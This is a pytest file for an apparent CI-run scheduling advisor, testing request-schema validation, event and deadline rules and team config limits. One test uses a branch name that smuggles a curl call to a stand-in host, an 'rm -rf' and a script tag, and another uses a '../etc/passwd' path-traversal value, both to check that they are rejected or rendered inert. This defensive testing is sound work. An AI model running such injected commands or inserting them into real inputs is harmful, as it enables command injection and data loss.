"""P4-T1 — the closed request schema and the team config (context/p4_interface.md §3, §5).

Defended: the advisor accepts no current-run outcome, no SE feature (other than
the Stage-1 `is_pr` input, DL-035 §3e), no `p_hat` and no unknown key; event,
region, scenario, deadline and clock rules map to their named fail-safe codes;
a crafted branch is data, never markup; team settings can only narrow.
"""

from __future__ import annotations

import pytest

from advisor import config as config_mod
from advisor.contract import (
    SE_FEATURE_NAMES, STAGE1_INPUTS_IN_FAMILIES, RequestError, parse_request,
)
from advisor.render import render_markdown
from scheduler_core import features
from scheduler_core.policy import load_policy_spec

from tests.advisor_helpers import NOW, request


def _code(raw) -> str:
    with pytest.raises(RequestError) as info:
        parse_request(raw, now=NOW)
    return info.value.code


def test_a_valid_request_parses():
    parsed = parse_request(request(), now=NOW)
    assert parsed.arrival.isoformat() == "2026-10-01T18:05:00+00:00"
    assert parsed.idempotency_key() == "demo-owner/demo-repo|ci.yml|" + parsed.head_sha + "|1"


@pytest.mark.parametrize("field", ["tr_duration", "tr_status", "tr_log_buildduration", "tr_log_num_tests_ok",
                                   "duration_s", "conclusion", "status", "p_hat"])
def test_current_run_outcome_fields_are_rejected(field):
    assert _code(request(**{field: 1})) == "invalid_request"


def test_every_se_feature_except_the_stage1_input_is_rejected():
    all_names = {n for members in features.FAMILIES.values() for n in members}
    assert len(all_names) == 28
    assert SE_FEATURE_NAMES == all_names - STAGE1_INPUTS_IN_FAMILIES == all_names - {"is_pr"}
    for name in sorted(SE_FEATURE_NAMES):
        assert _code(request(**{name: 1})) == "invalid_request", name


def test_unknown_and_missing_fields_are_rejected():
    assert _code(request(foo=1)) == "invalid_request"
    raw = request()
    del raw["branch"]
    assert _code(raw) == "invalid_request"
    assert _code(["not", "a", "mapping"]) == "invalid_request"


@pytest.mark.parametrize("repo", ["no-slash", "a/b/c", "owner/na me", "../etc/passwd", "o" * 40 + "/x"])
def test_repository_must_be_owner_slash_name(repo):
    assert _code(request(repository=repo)) == "invalid_request"


@pytest.mark.parametrize("branch", ["evil\nbranch", "tab\tbranch", "", "x" * 256])
def test_branch_rejects_control_characters_and_bad_lengths(branch):
    assert _code(request(branch=branch)) == "invalid_request"


def test_shell_looking_branch_is_accepted_as_plain_data_and_rendered_inert():
    branch = "feat/$(curl evil.sh)`rm -rf`<script>"
    parsed = parse_request(request(branch=branch), now=NOW)
    assert parsed.branch == branch
    md = render_markdown({"display": "RUN NOW", "action": "run_now", "statements": [], "reason": "x"},
                         branch=branch)
    assert "`rm" not in md and "feat/$(curl evil.sh)'rm -rf'<script>" in md


@pytest.mark.parametrize("event", ["pull_request_target", "workflow_run", "issue_comment", "release"])
def test_untrusted_events_are_refused(event):
    assert _code(request(event=event)) == "untrusted_event"


def test_is_pr_must_agree_with_the_event():
    assert _code(request(event="pull_request", is_pr=False)) == "invalid_request"
    assert _code(request(event="push", is_pr=True)) == "invalid_request"


def test_scenario_rules():
    assert parse_request(request(scenario="gb-hypothetical"), now=NOW).scenario == "gb-hypothetical"
    assert _code(request(scenario="gb-hypothetical", compute_region="US-EAST")) == "scenario_invalid"
    assert _code(request(scenario="mars")) == "scenario_invalid"


def test_deadline_and_clock_rules():
    assert _code(request(deadline_utc="2026-10-01T17:00:00Z")) == "deadline_invalid"
    assert _code(request(deadline_utc="tomorrow")) == "deadline_invalid"
    assert _code(request(arrival_utc="2026-10-01T19:00:00Z")) == "arrival_in_future"
    assert _code(request(arrival_utc="2026-10-01T18:05:00")) == "invalid_request"   # no offset


# --------------------------------------------------------------------------- #
# Team config.
# --------------------------------------------------------------------------- #

def test_config_defaults_and_closed_schema():
    cfg = config_mod.parse_team_config({"compute_region": "GB", "enabled_workflows": ["ci.yml"]})
    assert cfg.cold_start_run_now is True and cfg.max_delay_hours == 24.0
    assert cfg.veto_events == ("workflow_dispatch", "schedule")
    with pytest.raises(config_mod.ConfigError):
        config_mod.parse_team_config({"compute_region": "GB", "enabled_workflows": ["ci.yml"], "risk": 1})


@pytest.mark.parametrize("bad", [
    {"enabled_workflows": ["ci.yml"]},                                        # no region
    {"compute_region": "GB"},                                                 # no workflows
    {"compute_region": "GB", "enabled_workflows": ["ci.yml"], "max_delay_hours": 30},
    {"compute_region": "GB", "enabled_workflows": ["ci.yml"], "max_delay_hours": 0},
    {"compute_region": "GB", "enabled_workflows": ["ci.yml"], "veto_events": ["pull_request_target"]},
    {"compute_region": "GB", "enabled_workflows": ["ci.yml"], "cold_start_run_now": "yes"},
])
def test_invalid_configs_are_rejected(bad):
    with pytest.raises(config_mod.ConfigError):
        config_mod.parse_team_config(bad)


def test_the_delay_ceiling_is_the_frozen_window():
    """A team may shorten the evaluated window, never extend it (R3-B7); the two cannot drift."""
    spec = load_policy_spec()
    assert config_mod.MAX_DELAY_CEILING_HOURS == float(spec.active()["w_max_hours"])


def test_display_region_is_validated_but_never_fatal():
    ok = config_mod.parse_team_config({"compute_region": "GB", "enabled_workflows": ["ci.yml"],
                                       "grid_display_region": "ec1a"})
    assert ok.grid_display_region == "EC1A" and not ok.warnings
    by_id = config_mod.parse_team_config({"compute_region": "GB", "enabled_workflows": ["ci.yml"],
                                          "grid_display_region": 13})
    assert by_id.grid_display_region == 13
    bad = config_mod.parse_team_config({"compute_region": "GB", "enabled_workflows": ["ci.yml"],
                                        "grid_display_region": "not a postcode!"})
    assert bad.grid_display_region is None and bad.warnings
